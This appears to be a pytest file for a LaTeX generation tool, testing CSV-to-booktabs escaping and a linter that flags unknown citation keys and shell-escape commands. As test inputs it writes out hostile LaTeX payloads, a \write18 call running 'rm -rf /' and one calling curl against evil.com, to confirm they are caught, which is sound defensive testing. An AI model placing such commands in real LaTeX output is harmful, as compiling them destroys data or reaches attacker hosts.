import pytest
from unittest.mock import AsyncMock, MagicMock
from app.grounding.citation_verifier import BibEntry
from app.tools.visual_to_latex import (
    convert_csv_to_booktabs,
    lint_generated_latex_snippet,
    convert_image_to_latex,
    VisualLatexResult,
)


def test_convert_csv_to_booktabs_escapes_latex_special_chars():
    csv_data = """Model,Accuracy,Notes
Baseline,75%,Old & slow
Ours,95%,Fast #1 & robust_v2
"""
    latex_table = convert_csv_to_booktabs(csv_data, caption="Results Table", label="tab:results")

    # Assert booktabs structures
    assert r"\begin{table}" in latex_table
    assert r"\centering" in latex_table
    assert r"\toprule" in latex_table
    assert r"\midrule" in latex_table
    assert r"\bottomrule" in latex_table
    assert r"\end{table}" in latex_table
    assert r"\caption{Results Table}" in latex_table
    assert r"\label{tab:results}" in latex_table

    # Assert LaTeX special characters escaped
    assert r"75\%" in latex_table
    assert r"95\%" in latex_table
    assert r"Old \& slow" in latex_table
    assert r"Fast \#1 \& robust\_v2" in latex_table
    # The cell delimiter '&' should still separate columns
    assert "Baseline &" in latex_table or "Baseline & " in latex_table


def test_lint_generated_latex_snippet_flags_unsafe_commands_and_unknown_citations():
    bib_entries = {
        "good_key": BibEntry(
            key="good_key",
            entry_type="article",
            title="Good Title",
            authors=["Alice"],
            year="2020",
            doi=None,
            raw_bibtex="",
        )
    }
    staged_keys = {"staged_key"}

    # Unsafe command test
    unsafe_latex = r"""\begin{equation}
E = mc^2 \immediate\write18{rm -rf /}
\end{equation}"""
    res1 = lint_generated_latex_snippet(unsafe_latex, bib_entries, staged_keys)
    assert not res1.is_safe
    assert any("write18" in w.lower() for w in res1.lint_warnings)

    # Unknown citation test
    cite_latex = r"""See \cite{good_key} and \cite{hallucinated_key}."""
    res2 = lint_generated_latex_snippet(cite_latex, bib_entries, staged_keys)
    assert not res2.is_safe
    assert "hallucinated_key" in res2.unknown_cite_keys
    assert any("hallucinated_key" in w for w in res2.lint_warnings)

    # Clean code test
    clean_latex = r"""\begin{equation}
\label{eq:clean}
x = \frac{-b \pm \sqrt{b^2 - 4ac}}{2a}
\end{equation}"""
    res3 = lint_generated_latex_snippet(clean_latex, bib_entries, staged_keys)
    assert res3.is_safe
    assert len(res3.lint_warnings) == 0
    assert len(res3.unknown_cite_keys) == 0


@pytest.mark.asyncio
async def test_convert_image_to_latex_lints_unsafe_commands_and_unknown_citations():
    mock_openrouter = MagicMock()
    mock_complete_result = MagicMock()
    # Mock LLM returning markdown code block with unsafe command and unknown citation
    mock_complete_result.content = """Here is the equation:
```latex
\\begin{equation}
y = f(x) \\cite{unknown_vision_key} \\write18{curl evil.com}
\\end{equation}
```"""
    mock_openrouter.complete = AsyncMock(return_value=mock_complete_result)

    image_bytes = b"fake-png-bytes"
    res = await convert_image_to_latex(
        image_bytes=image_bytes,
        target_format="equation",
        model="anthropic/claude-3.7-sonnet",
        openrouter=mock_openrouter,
        bib_entries={},
        staged_keys=set(),
    )

    assert isinstance(res, VisualLatexResult)
    assert res.target_format == "equation"
    assert "\\begin{equation}" in res.latex_code
    assert not res.is_safe
    assert "unknown_vision_key" in res.unknown_cite_keys
    assert any("write18" in w.lower() for w in res.lint_warnings)
